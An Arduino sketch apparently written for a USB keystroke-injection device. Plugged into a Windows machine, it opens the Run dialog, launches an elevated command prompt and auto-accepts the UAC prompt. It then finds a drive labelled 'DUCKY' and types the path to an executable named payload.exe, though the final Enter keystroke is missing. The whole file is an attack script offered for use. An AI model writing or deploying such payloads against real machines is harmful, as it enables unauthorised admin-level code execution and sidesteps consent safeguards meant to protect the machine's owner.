```cpp
#include <HID-Project.h>
#include <HID-Settings.h>

// Utility function
void typeKey(int key){
  Keyboard.press(key);
  delay(50);
  Keyboard.release(key);
}

void setup()
{
  // Start Keyboard and Mouse
  AbsoluteMouse.begin();
  Keyboard.begin();

  // Start Payload
  Keyboard.press(KEY_LEFT_GUI);
  Keyboard.press(114);
  Keyboard.releaseAll();

  delay(200);

  Keyboard.print("powershell Start-Process cmd.exe -Verb runAs");

  typeKey(KEY_RETURN);

  delay(2000);

  Keyboard.press(KEY_LEFT_ALT);
  Keyboard.press(121);
  Keyboard.releaseAll();

  delay(500);

  Keyboard.print("for /f %d in ('wmic volume get driveletter^, label ^| findstr \"DUCKY\"') do set duck=%d");

  typeKey(KEY_RETURN);

  Keyboard.print("%duck%\\payload.exe");

  // End Payload

  // Stop Keyboard and Mouse
  Keyboard.end();
  AbsoluteMouse.end();
}

// Unused
void loop() {}
```